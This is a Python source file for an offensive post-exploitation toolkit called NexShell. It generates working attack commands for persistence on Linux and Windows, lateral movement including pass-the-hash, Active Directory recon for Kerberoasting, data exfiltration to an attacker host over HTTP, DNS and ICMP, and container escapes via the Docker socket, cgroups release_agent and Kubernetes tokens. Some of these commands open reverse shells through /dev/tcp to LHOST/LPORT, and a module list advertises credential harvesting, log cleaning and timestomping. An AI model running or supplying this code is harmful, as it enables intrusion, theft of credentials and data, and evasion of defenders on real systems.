#!/usr/bin/env python3
"""
NexShell — Operational Modules
Professional post-exploitation modules: persistence, lateral movement,
C2 staging, AD recon, container escape, data exfiltration.
"""


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: PERSISTENCE
# ══════════════════════════════════════════════════════════════════════════════

class PersistenceModule:
    """Cross-platform persistence mechanisms."""

    # ── Linux ─────────────────────────────────────────────────────────────────
    @staticmethod
    def linux_crontab(cmd: str, interval: str = '*/5 * * * *') -> str:
        return f"(crontab -l 2>/dev/null; echo '{interval} {cmd}') | crontab -"

    @staticmethod
    def linux_bashrc(cmd: str) -> str:
        return f"echo '{cmd}' >> ~/.bashrc"

    @staticmethod
    def linux_systemd(name: str, cmd: str, host: str, port: int) -> str:
        return (
            f"cat > /tmp/{name}.service << 'EOF'\n"
            f"[Unit]\nDescription={name}\nAfter=network.target\n\n"
            f"[Service]\nType=simple\nRestart=always\nRestartSec=30\n"
            f"ExecStart={cmd}\n\n"
            f"[Install]\nWantedBy=multi-user.target\nEOF\n"
            f"sudo mv /tmp/{name}.service /etc/systemd/system/\n"
            f"sudo systemctl daemon-reload\n"
            f"sudo systemctl enable {name}\n"
            f"sudo systemctl start {name}"
        )

    @staticmethod
    def linux_authorized_keys(pubkey: str) -> str:
        return (
            "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"echo '{pubkey}' >> ~/.ssh/authorized_keys && "
            "chmod 600 ~/.ssh/authorized_keys"
        )

    @staticmethod
    def linux_suid_shell() -> str:
        return "cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh && /tmp/.nxsh -p"

    @staticmethod
    def linux_rc_local(cmd: str) -> str:
        return (
            f"echo '{cmd}' >> /etc/rc.local && chmod +x /etc/rc.local"
        )

    @staticmethod
    def linux_ld_preload(so_path: str) -> str:
        return f"echo '{so_path}' >> /etc/ld.so.preload"

    # ── Windows ───────────────────────────────────────────────────────────────
    @staticmethod
    def windows_registry_run(name: str, payload: str) -> str:
        return (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            f'/v "{name}" /t REG_SZ /d "{payload}" /f'
        )

    @staticmethod
    def windows_registry_run_once(name: str, payload: str) -> str:
        return (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce '
            f'/v "{name}" /t REG_SZ /d "{payload}" /f'
        )

    @staticmethod
    def windows_schtask(name: str, payload: str, trigger: str = 'ONLOGON') -> str:
        return (
            f'schtasks /create /tn "{name}" /tr "{payload}" '
            f'/sc {trigger} /ru SYSTEM /f'
        )

    @staticmethod
    def windows_startup_folder(payload_name: str) -> str:
        return (
            f'copy payload.bat '
            f'"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{payload_name}.bat"'
        )

    @staticmethod
    def windows_wmi_subscription(name: str, payload: str) -> str:
        return (
            f"$filter = ([wmiclass]'root\\subscription:__EventFilter').CreateInstance();"
            f"$filter.Name = '{name}';"
            f"$filter.QueryLanguage = 'WQL';"
            f"$filter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";"
            f"$filter.Put();"
            f"$consumer = ([wmiclass]'root\\subscription:CommandLineEventConsumer').CreateInstance();"
            f"$consumer.Name = '{name}';"
            f"$consumer.CommandLineTemplate = '{payload}';"
            f"$consumer.Put();"
            f"$binding = ([wmiclass]'root\\subscription:__FilterToConsumerBinding').CreateInstance();"
            f"$binding.Filter = $filter.Path;\n$binding.Consumer = $consumer.Path;\n$binding.Put()"
        )

    @classmethod
    def all_linux(cls, cmd: str) -> list:
        return [
            ('crontab',         cls.linux_crontab(cmd)),
            ('~/.bashrc',       cls.linux_bashrc(cmd)),
            ('SUID bash',       cls.linux_suid_shell()),
            ('authorized_keys', '# Add your public key via: linux_authorized_keys("<pubkey>")'),
        ]

    @classmethod
    def all_windows(cls, payload: str, name: str = 'NxSvc') -> list:
        return [
            ('HKCU Run key',       cls.windows_registry_run(name, payload)),
            ('Startup folder',     cls.windows_startup_folder(name)),
            ('Scheduled task',     cls.windows_schtask(name, payload)),
            ('WMI subscription',   cls.windows_wmi_subscription(name, payload)),
        ]


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: LATERAL MOVEMENT
# ══════════════════════════════════════════════════════════════════════════════

class LateralMovement:
    """Lateral movement techniques — Linux and Windows."""

    # ── Linux ─────────────────────────────────────────────────────────────────
    @staticmethod
    def ssh_hop(user: str, target: str, key: str = None) -> str:
        key_arg = f"-i {key}" if key else ""
        return f"ssh {key_arg} -o StrictHostKeyChecking=no {user}@{target}"

    @staticmethod
    def ssh_agent_hijack(sock_path: str) -> str:
        return (
            f"export SSH_AUTH_SOCK={sock_path}; "
            "ssh-add -l 2>/dev/null && "
            "ssh -o StrictHostKeyChecking=no $(hostname)"
        )

    @staticmethod
    def psexec_equivalent(target: str, user: str, password: str, cmd: str) -> str:
        return (
            f"smbclient //{target}/ADMIN$ -U '{user}%{password}' -c "
            f"'put /tmp/payload.exe payload.exe' && "
            f"winexe -U '{user}%{password}' //{target} '{cmd}'"
        )

    @staticmethod
    def docker_escape_socket() -> str:
        return (
            "docker -H unix:///var/run/docker.sock run -it "
            "--privileged --pid=host debian nsenter -t 1 -m -u -n -i sh"
        )

    @staticmethod
    def docker_escape_volume() -> str:
        return (
            "docker run -it -v /:/host debian chroot /host /bin/bash"
        )

    @staticmethod
    def lxd_escape() -> str:
        return (
            "lxc init ubuntu:18.04 privesc -c security.privileged=true; "
            "lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true; "
            "lxc start privesc; "
            "lxc exec privesc /bin/sh"
        )

    @staticmethod
    def nfs_mount_exploit(server: str, share: str) -> str:
        return (
            f"showmount -e {server}; "
            f"mkdir /tmp/nfsmount; "
            f"mount -t nfs {server}:{share} /tmp/nfsmount -o nolock; "
            "ls -la /tmp/nfsmount"
        )

    # ── Windows ───────────────────────────────────────────────────────────────
    @staticmethod
    def psexec_windows(target: str, domain: str, user: str, password: str) -> str:
        return (
            f"Invoke-Command -ComputerName {target} -Credential "
            f"(New-Object PSCredential('{domain}\\{user}',"
            f"(ConvertTo-SecureString '{password}' -AsPlainText -Force))) "
            f"-ScriptBlock {{whoami}}"
        )

    @staticmethod
    def wmiexec_windows(target: str, user: str, password: str, cmd: str) -> str:
        return (
            f"$wmi = [wmiclass]\"\\\\{target}\\root\\cimv2:Win32_Process\";"
            f"$wmi.Create('{cmd}')"
        )

    @staticmethod
    def dcom_exec(target: str, cmd: str) -> str:
        return (
            f"$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{target}'));"
            f"$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",$null,'/c {cmd}','7')"
        )

    @staticmethod
    def pass_the_hash(target: str, user: str, ntlm_hash: str) -> str:
        return (
            f"Invoke-WMIMethod -ComputerName {target} -Class Win32_Process "
            f"-Name Create -ArgumentList 'cmd.exe /c whoami > C:\\result.txt' "
            f"-Credential (Get-Credential)"
            f"\n# or via impacket:\n"
            f"python3 wmiexec.py -hashes :{ntlm_hash} {user}@{target}"
        )

    @staticmethod
    def smb_scan(subnet: str) -> str:
        return (
            f"1..254 | ForEach-Object {{"
            f"$ip = '{subnet}.' + $_;"
            "Test-Connection -ComputerName $ip -Count 1 -Quiet | "
            "Where-Object {$_} | ForEach-Object {Write-Host $ip}}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: ACTIVE DIRECTORY RECON
# ══════════════════════════════════════════════════════════════════════════════

class ADRecon:
    """Active Directory enumeration — all in PowerShell (no tools needed)."""

    @staticmethod
    def domain_info() -> str:
        return (
            "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | "
            "Select Name,DomainControllers,DomainMode,Parent,Children"
        )

    @staticmethod
    def list_users() -> str:
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(objectCategory=person))';"
            "$searcher.PageSize = 1000;"
            "$searcher.FindAll() | ForEach-Object {"
            "$_.Properties['samaccountname'],'|',"
            "$_.Properties['description'],'|',"
            "$_.Properties['memberof'] | Select-Object -First 1"
            "} | Select-Object -First 100"
        )

    @staticmethod
    def list_admins() -> str:
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(adminCount=1))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host $_.Properties['samaccountname']}"
        )

    @staticmethod
    def list_dcs() -> str:
        return (
            "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"
            ".DomainControllers | Select Name,IPAddress,OSVersion"
        )

    @staticmethod
    def spn_scan() -> str:
        """Kerberoastable accounts (SPNs)."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host $_.Properties['samaccountname'] '→' $_.Properties['serviceprincipalname']}"
        )

    @staticmethod
    def asreproast() -> str:
        """ASREPRoastable accounts (no preauth required)."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host '[!] ASREPRoastable:' $_.Properties['samaccountname']}"
        )

    @staticmethod
    def find_delegation() -> str:
        """Unconstrained/constrained delegation."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            "(userAccountControl:1.2.840.113556.1.4.803:=16777216))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host '[!] Delegation:' $_.Properties['samaccountname'] '|' $_.Properties['dnshostname']}"
        )

    @staticmethod
    def bloodhound_collection() -> str:
        """SharpHound-style data collection via PowerShell."""
        return (
            "IEX(New-Object Net.WebClient).DownloadString("
            "'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');"
            "Invoke-BloodHound -CollectionMethod All -Domain (gwmi Win32_ComputerSystem).Domain"
        )

    @staticmethod
    def laps_passwords() -> str:
        """Read LAPS managed passwords."""
        return (
            "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | "
            "Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | "
            "Select Name,'ms-Mcs-AdmPwd'"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: DATA EXFILTRATION
# ══════════════════════════════════════════════════════════════════════════════

class DataExfil:
    """Covert data exfiltration techniques."""

    @staticmethod
    def http_get_params(data: str, url: str) -> str:
        import base64 as b64
        encoded = b64.b64encode(data.encode()).decode()
        return f"curl -s '{url}?d={encoded}' > /dev/null"

    @staticmethod
    def dns_exfil(data: str, domain: str) -> str:
        return (
            f"data=$(echo '{data}'|base64|tr -d '='|tr '+/' '-_');"
            f"echo $data|fold -w 60|while read chunk; do nslookup $chunk.$domain; done"
        )

    @staticmethod
    def icmp_exfil(data: str, host: str) -> str:
        return f"ping -c 1 -p $(echo '{data}'|xxd -p|head -c 16) {host}"

    @staticmethod
    def linux_http_exfil(file: str, host: str, port: int) -> str:
        return (
            f"curl -s -X POST http://{host}:{port}/upload "
            f"-F 'file=@{file}' > /dev/null 2>&1"
        )

    @staticmethod
    def windows_https_exfil(file: str, host: str, port: int) -> str:
        return (
            f"$bytes=[System.IO.File]::ReadAllBytes('{file}');"
            f"$b64=[Convert]::ToBase64String($bytes);"
            f"Invoke-WebRequest -Uri 'https://{host}:{port}/upload' "
            f"-Method POST -Body $b64 -UseBasicParsing"
        )

    @staticmethod
    def smb_exfil(file: str, target: str, share: str) -> str:
        return f"copy {file} \\\\{target}\\{share}\\loot\\"

    @staticmethod
    def certutil_encode(file: str) -> str:
        return f"certutil -encode {file} {file}.b64 && type {file}.b64"


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: CONTAINER ESCAPE  (Detection + Automated Exploitation)
# ══════════════════════════════════════════════════════════════════════════════

class ContainerEscape:
    """
    Comprehensive container escape module.
    Detection: fingerprint runtime, capabilities, mounts.
    Exploitation: automated one-liners per vector.
    """

    # ── Detection ─────────────────────────────────────────────────────────────
    @staticmethod
    def full_detect() -> str:
        """One script — checks every escape vector and reports findings."""
        return r"""
echo "=== [NexShell Container Escape Detector] ==="

# Runtime identification
echo "--- Runtime ---"
[ -f /.dockerenv ]           && echo "[+] Docker container detected"
[ -f /run/.containerenv ]    && echo "[+] Podman container detected"
grep -qi 'lxc' /proc/1/cgroup 2>/dev/null  && echo "[+] LXC container detected"
grep -qi 'kubepods' /proc/1/cgroup 2>/dev/null && echo "[+] Kubernetes pod detected"
systemd-detect-virt 2>/dev/null | grep -qi 'docker\|lxc\|container' && echo "[+] virt-detect: container"

# Capability check
echo "--- Capabilities ---"
CAP=$(cat /proc/self/status 2>/dev/null | grep CapEff | awk '{print $2}')
echo "CapEff: $CAP"
[ "$CAP" = "0000003fffffffff" ] || [ "$CAP" = "ffffffffffffffff" ] && \
    echo "[!!!] PRIVILEGED CONTAINER — full cap set"

# Docker socket
echo "--- Docker Socket ---"
for sock in /var/run/docker.sock /run/docker.sock /tmp/docker.sock; do
    [ -S "$sock" ] && echo "[!!!] Docker socket accessible: $sock"
done

# Host mounts & writable paths
echo "--- Mounts ---"
mount | grep -v 'proc\|sysfs\|devpts\|tmpfs\|overlay\|cgroup' | \
    grep -E 'rw|ext[234]|xfs|btrfs' | head -10
findmnt -n --target /etc/cron.d 2>/dev/null && echo "[+] /etc/cron.d mounted from host"
findmnt -n --target /root 2>/dev/null        && echo "[+] /root mounted from host"

# cgroups v1 release_agent
echo "--- cgroups v1 ---"
if grep -q 'rdma' /proc/cgroups 2>/dev/null; then
    echo "[+] cgroups v1 rdma subsystem available (release_agent escape possible)"
fi
# cgroups v2 (CVE-2022-0492 style check)
[ -f /sys/fs/cgroup/cgroup.subtree_control ] && \
    echo "[?] cgroups v2 detected — check unshare privesc"

# runc / container runtime version
echo "--- Runtime version ---"
runc --version 2>/dev/null | head -2
containerd --version 2>/dev/null | head -1

# Kubernetes service account
echo "--- Kubernetes ---"
[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && \
    echo "[!!!] K8s service account token found — API abuse possible"
env | grep -i 'kubernetes\|k8s\|kube' | head -5

# Writable host paths
echo "--- Host path abuse ---"
[ -w /etc/cron.d ]              && echo "[!!!] /etc/cron.d writable"
[ -w /etc/cron.hourly ]         && echo "[!!!] /etc/cron.hourly writable"
[ -w /usr/local/bin ]           && echo "[!!!] /usr/local/bin writable"
[ -w /etc/ld.so.preload ]       && echo "[!!!] /etc/ld.so.preload writable"

# Namespace check
echo "--- Namespaces ---"
ls -la /proc/1/ns/ 2>/dev/null | head -5

echo "=== [Done] ==="
"""

    # ── Exploitation: Privileged container ────────────────────────────────────
    @staticmethod
    def escape_privileged() -> str:
        """Mount host filesystem and chroot. Requires SYS_ADMIN + privileged."""
        return (
            "# Step 1: Find host disk\n"
            "HOST_DISK=$(fdisk -l 2>/dev/null | grep -oP '/dev/sd[a-z][0-9]?' | head -1)\n"
            "[ -z \"$HOST_DISK\" ] && HOST_DISK=$(df / | awk 'NR==2{print $1}' | sed 's/[0-9]$/1/')\n"
            "echo \"[*] Target disk: $HOST_DISK\"\n"
            "# Step 2: Mount host root\n"
            "mkdir -p /mnt/nxsh_host\n"
            "mount $HOST_DISK /mnt/nxsh_host 2>/dev/null && echo '[+] Host mounted at /mnt/nxsh_host'\n"
            "# Step 3: Escape\n"
            "chroot /mnt/nxsh_host /bin/bash -c 'id; hostname'"
        )

    # ── Exploitation: Docker socket ────────────────────────────────────────────
    @staticmethod
    def escape_docker_socket(lhost: str = '', lport: int = 0) -> str:
        """Use accessible docker socket to escape to host."""
        rev = ''
        if lhost and lport:
            rev = (
                f" -e 'RHOST={lhost}' -e 'RPORT={lport}'"
                " alpine sh -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'"
            )
        if not rev:
            return (
                "SOCK=/var/run/docker.sock\n"
                "[ -S /run/docker.sock ] && SOCK=/run/docker.sock\n"
                "echo '[*] Escaping via docker socket...'\n"
                "docker -H unix://$SOCK run -it --rm --privileged "
                "--pid=host --net=host --ipc=host "
                "-v /:/host -w /host "
                "alpine chroot /host /bin/bash"
            )
        return (
            "SOCK=/var/run/docker.sock\n"
            "[ -S /run/docker.sock ] && SOCK=/run/docker.sock\n"
            f"docker -H unix://$SOCK run --rm --privileged "
            "--pid=host --net=host "
            f"-v /:/host{rev}"
        )

    # ── Exploitation: cgroups v1 release_agent ────────────────────────────────
    @staticmethod
    def escape_cgroups_v1(cmd: str = 'cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh') -> str:
        """CVE-2022-0492 / classic cgroups v1 release_agent escape."""
        return (
            "echo '[*] Attempting cgroups v1 release_agent escape...'\n"
            "# Find writable cgroup mount\n"
            "CGRP=$(cat /proc/mounts | grep 'cgroup ' | grep -v cgroup2 | head -1 | awk '{print $2}')\n"
            "[ -z \"$CGRP\" ] && CGRP=/tmp/cgroot && mount -t cgroup -o rdma cgroup $CGRP 2>/dev/null\n"
            "echo \"[*] cgroup mount: $CGRP\"\n"
            "# Create sub-cgroup\n"
            "mkdir -p $CGRP/nxsh_escape\n"
            "echo 1 > $CGRP/nxsh_escape/notify_on_release\n"
            "# Write payload\n"
            "HOST_PATH=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab 2>/dev/null | head -1)\n"
            f"echo '#!/bin/sh' > /tmp/payload.sh\n"
            f"echo '{cmd}' >> /tmp/payload.sh\n"
            "chmod +x /tmp/payload.sh\n"
            "echo \"${HOST_PATH}/tmp/payload.sh\" > $CGRP/release_agent\n"
            "# Trigger\n"
            "sh -c \"echo \\$\\$ > $CGRP/nxsh_escape/cgroup.procs\"\n"
            "sleep 2\n"
            "echo '[+] Payload triggered — check /tmp/.nxsh'\n"
            "/tmp/.nxsh -p 2>/dev/null && echo '[+] Root shell acquired!'"
        )

    # ── Exploitation: Kubernetes service account abuse ─────────────────────────
    @staticmethod
    def escape_kubernetes() -> str:
        """Abuse K8s service account token for cluster admin / exec."""
        return (
            "echo '[*] K8s service account escape...'\n"
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
            "API=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n"
            "\n# Check own permissions\n"
            "curl -sk -H \"Authorization: Bearer $TOKEN\" $API/api/v1/namespaces/default/pods | python3 -m json.tool 2>/dev/null | grep -E 'name|status' | head -20\n"
            "\n# Try to create privileged pod (host-mounted)\n"
            "cat <<EOF | curl -sk -X POST $API/api/v1/namespaces/default/pods \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -H \"Authorization: Bearer $TOKEN\" --cacert $CA -d @-\n"
            '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nxsh-escape"},'
            '"spec":{"hostPID":true,"hostIPC":true,"hostNetwork":true,'
            '"containers":[{"name":"nxsh","image":"alpine",'
            '"command":["/bin/sh","-c","nsenter -t 1 -m -u -i -n /bin/bash"],'
            '"securityContext":{"privileged":true},'
            '"volumeMounts":[{"mountPath":"/host","name":"host"}]}],'
            '"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}\nEOF'
        )

    # ── Exploitation: runc / namespace escape ──────────────────────────────────
    @staticmethod
    def escape_runc_namespace() -> str:
        """Use nsenter to break out of container namespaces (host PID required)."""
        return (
            "echo '[*] Namespace escape via nsenter (requires host PID access)...'\n"
            "# Find host init PID via /proc\n"
            "HOST_PID=$(ls -la /proc/*/exe 2>/dev/null | grep -v 'self\\|thread' | head -5)\n"
            "echo \"Visible PIDs: $HOST_PID\"\n"
            "\n# nsenter approach (requires CAP_SYS_PTRACE or --pid=host)\n"
            "nsenter -t 1 -m -u -i -n -p -- /bin/bash 2>/dev/null && echo '[+] Escaped!'\n"
            "# Alternative: chroot to /proc/1/root\n"
            "ls /proc/1/root/ 2>/dev/null | head -10\n"
            "chroot /proc/1/root /bin/bash 2>/dev/null || echo '[-] /proc/1/root not accessible'"
        )

    # ── Exploitation: Writable host path ──────────────────────────────────────
    @staticmethod
    def escape_writable_hostpath(cmd: str = 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1') -> str:
        """Write to a host-mounted path to achieve persistence/escape."""
        return (
            "echo '[*] Checking writable host paths...'\n"
            "\n# Via cron\n"
            "if [ -w /etc/cron.d ]; then\n"
            f"    echo '* * * * * root {cmd}' > /etc/cron.d/nxsh\n"
            "    echo '[+] Cron job written to /etc/cron.d/nxsh'\n"
            "fi\n"
            "\n# Via ld.so.preload\n"
            "if [ -w /etc/ld.so.preload ]; then\n"
            "    echo '[+] /etc/ld.so.preload writable — shared library injection possible'\n"
            "fi\n"
            "\n# Via /usr/local/bin\n"
            "if [ -w /usr/local/bin ]; then\n"
            "    cp /bin/bash /usr/local/bin/nxsh\n"
            "    chmod 4755 /usr/local/bin/nxsh\n"
            "    echo '[+] SUID bash written to /usr/local/bin/nxsh'\n"
            "fi"
        )

    # ── Auto-escape: try all vectors ──────────────────────────────────────────
    @staticmethod
    def auto_escape(lhost: str = '', lport: int = 0) -> str:
        """Try all escape vectors in order of reliability."""
        return (
            "echo '=== [NexShell Auto-Escape] ==='\n"
            "\n# Vector 1: Docker socket\n"
            "for sock in /var/run/docker.sock /run/docker.sock; do\n"
            "    if [ -S \"$sock\" ]; then\n"
            f"        echo '[!] Docker socket found: $sock'\n"
            "        docker -H unix://$sock run --rm --privileged "
            "--pid=host -v /:/host alpine chroot /host id 2>/dev/null && "
            "echo '[+] Docker socket escape SUCCESS' && break\n"
            "    fi\n"
            "done\n"
            "\n# Vector 2: Privileged cap check\n"
            "CAP=$(grep CapEff /proc/self/status | awk '{print $2}')\n"
            "if [ \"$CAP\" = 'ffffffffffffffff' ] || [ \"$CAP\" = '0000003fffffffff' ]; then\n"
            "    echo '[!] Privileged container — mounting host FS'\n"
            "    mkdir -p /mnt/nxsh_host\n"
            "    mount $(df|awk 'NR==2{print $1}') /mnt/nxsh_host 2>/dev/null && \\\n"
            "    chroot /mnt/nxsh_host id && echo '[+] Privileged escape SUCCESS'\n"
            "fi\n"
            "\n# Vector 3: K8s service account\n"
            "[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && \\\n"
            "echo '[!] K8s service account found — run: nexshell run container k8s'\n"
            "\n# Vector 4: Writable host paths\n"
            "for path in /etc/cron.d /etc/cron.hourly /usr/local/bin; do\n"
            "    [ -w \"$path\" ] && echo \"[!] Writable host path: $path\"\n"
            "done\n"
            "echo '=== [Done] ==='"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE REGISTRY — all modules callable from MainMenu
# ══════════════════════════════════════════════════════════════════════════════

MODULE_REGISTRY = {
    # ── Linux Recon ───────────────────────────────────────────────────────────
    'quickenum':        {'desc': 'Fast Linux system enumeration (in-memory)',        'os': 'linux',   'type': 'recon'},
    'privesc':          {'desc': 'Linux PrivEsc advisor (SUID/GTFOBins/cron)',       'os': 'linux',   'type': 'privesc'},
    'credharvest':      {'desc': 'Linux credential harvester (.env/ssh/hist)',       'os': 'linux',   'type': 'creds'},
    # ── Windows Recon ─────────────────────────────────────────────────────────
    'win-enum':         {'desc': 'Windows system enumeration',                       'os': 'windows', 'type': 'recon'},
    'win-privesc':      {'desc': 'Windows PrivEsc advisor (AlwaysInstall/UAC/svc)', 'os': 'windows', 'type': 'privesc'},
    'win-creds':        {'desc': 'Windows credential harvester (DPAPI/SAM/reg)',    'os': 'windows', 'type': 'creds'},
    # ── Active Directory ──────────────────────────────────────────────────────
    'ad-recon':         {'desc': 'AD enumeration (no tools needed, pure PS)',        'os': 'windows', 'type': 'ad'},
    'ad-kerberoast':    {'desc': 'Find & roast Kerberoastable SPNs',                'os': 'windows', 'type': 'ad'},
    'ad-asreproast':    {'desc': 'Find ASREPRoastable accounts',                    'os': 'windows', 'type': 'ad'},
    # ── Persistence ───────────────────────────────────────────────────────────
    'persist-linux':    {'desc': 'Linux persistence (cron/systemd/suid/ssh-key)',   'os': 'linux',   'type': 'persist'},
    'persist-win':      {'desc': 'Windows persistence (reg/schtask/WMI/startup)',   'os': 'windows', 'type': 'persist'},
    # ── Lateral Movement ──────────────────────────────────────────────────────
    'lateral':          {'desc': 'Lateral movement commands (SSH/WMI/DCOM/PTH)',    'os': 'both',    'type': 'lateral'},
    # ── Container Escape ──────────────────────────────────────────────────────
    'container':        {'desc': 'Auto-detect container escape vectors',             'os': 'linux',   'type': 'escape'},
    'container-auto':   {'desc': 'Automated container escape (tries all vectors)',   'os': 'linux',   'type': 'escape'},
    'container-docker': {'desc': 'Docker socket escape (interactive)',               'os': 'linux',   'type': 'escape'},
    'container-cgroup': {'desc': 'cgroups v1 release_agent escape (CVE-2022-0492)', 'os': 'linux',   'type': 'escape'},
    'container-k8s':    {'desc': 'Kubernetes service account abuse / pod escape',   'os': 'linux',   'type': 'escape'},
    'container-ns':     {'desc': 'Namespace escape via nsenter',                    'os': 'linux',   'type': 'escape'},
    # ── Exfiltration ──────────────────────────────────────────────────────────
    'exfil':            {'desc': 'Data exfiltration (HTTP/DNS/ICMP/SMB/certutil)',  'os': 'both',    'type': 'exfil'},
    # ── Loot ──────────────────────────────────────────────────────────────────
    'loot':             {'desc': 'Auto-collect loot (creds/keys/tokens/hashes)',    'os': 'both',    'type': 'loot'},
    'loot-scan':        {'desc': 'Scan session output for sensitive data',          'os': 'both',    'type': 'loot'},
    'loot-report':      {'desc': 'Generate loot report (JSON/MD/HTML)',             'os': 'both',    'type': 'loot'},
    # ── OPSEC ─────────────────────────────────────────────────────────────────
    'opsec':            {'desc': 'Show/set OPSEC profile (ghost/normal/paranoid)',  'os': 'both',    'type': 'opsec'},
    'timestomp':        {'desc': 'Modify file timestamps to match system files',    'os': 'both',    'type': 'opsec'},
    'logclean':         {'desc': 'Clean logs and shell history on target',          'os': 'both',    'type': 'opsec'},
    'obfuscate':        {'desc': 'Obfuscate a command (XOR/B64/hex/chararray)',     'os': 'both',    'type': 'opsec'},
}


def list_modules(os_filter: str = 'all', type_filter: str = 'all') -> list:
    """Return modules matching the given OS and type filters."""
    result = []
    for name, meta in MODULE_REGISTRY.items():
        if os_filter != 'all' and meta['os'] not in (os_filter, 'both'):
            continue
        if type_filter != 'all' and meta['type'] != type_filter:
            continue
        result.append({'name': name, **meta})
    return result
